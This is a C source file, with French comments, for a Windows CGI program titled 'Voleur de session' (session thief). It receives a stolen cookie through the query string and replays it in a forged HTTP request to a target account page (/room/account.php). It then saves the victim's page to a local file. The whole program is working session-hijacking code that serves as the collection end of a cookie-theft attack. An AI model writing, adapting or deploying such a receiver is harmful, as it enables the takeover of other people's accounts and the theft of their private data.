#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock.h>

#define	TITLE "Voleur de session"
#define HOST "localhost"
#define URI "/room/account.php"

char x2c(char *what);
void header();
void footer();

int main(int argc, char *argv[])
{
	FILE *out;
	char requete[1024];
	WSADATA wsa;
	SOCKET sock;
	SOCKADDR_IN addr;
	struct hostent *hp;
	char ch;

	char *qs = (char *)malloc(256);
	int x = 0, i = 0, c = 0, f = 0;
	qs = getenv("QUERY_STRING");
	if (qs != NULL){
		/*
		 * Bout de code dont je ne connais pas l'auteur qui
		 * permet de traduire les %xx en leurs caractères.
		 */
		for (x = 0, i = 0; qs[i]; x++, i++) {
			if ((qs[x] = qs[i]) == '%') {
				qs[x] = x2c(&qs[i + 1]);
				i += 2;
			}
		}
		qs[x] = '\0';

		header();

		/*
		 * Here you must put your c0d3 !
		 */
		printf("Ton cookie semble etre :<br>%s<br>\n",qs);

		sprintf(requete,"GET %s HTTP/1.1\n"
			            "Host: %s\nCookie: ",
						URI,
						HOST);
		lstrcat(requete,qs);
		lstrcat(requete,"\nConnection: close\n\n");
		
		printf("Essayons la requete :<br>%s<br>\n",requete);
		
		if(WSAStartup(0x0101,&wsa)!=0)
		{
			printf("Initialisation de winsock impossible!");
			return 0;
		}
		if((hp = gethostbyname(HOST))==0)
		{
			printf("Impossible de trouver %s",HOST);
			return 1;
		}
		
		if((sock = socket(AF_INET, SOCK_STREAM, 0))==-1)
		{
			printf("Pb creation socket");
			return 1;
		}
		addr.sin_addr=*((struct in_addr *)hp->h_addr);
		addr.sin_family=AF_INET;
		addr.sin_port=htons(80);
		
		if(!(connect(sock,(SOCKADDR *)&addr,sizeof(addr))))
		{
			printf("Connexion OK\n<br>");
			send(sock,requete,strlen(requete),0);
			printf("Data sended\n<br>");
			printf("\n");
			out=fopen("file.txt","w");
			while((recv(sock, &ch, 1, 0))==1)
			{
				fputc(ch,out);
			}
			fclose(out);
		}
		else
		{
			printf("Impossible de se connecter\n");
		}
		closesocket(sock);
		WSACleanup();
			  
	}
	footer();
	return 0;
}

char x2c(char *what)
{
	register char digit;
	
	digit = (what[0] >= 'A' ? ((what[0] & 0xdf) - 'A')+10 : (what[0] - '0'));
	digit *= 16;
	digit += (what[1] >= 'A' ? ((what[1] & 0xdf) - 'A')+10 : (what[1] - '0'));
	return (digit);
}

void header() {
	printf("Content-type: text/html\n\n");
	printf("<html>\n<head><title>%s</title></head>\n", TITLE);
	printf("<body>\n<pre>\n");
}

void footer() {
	printf("</pre></body></html>\n");
}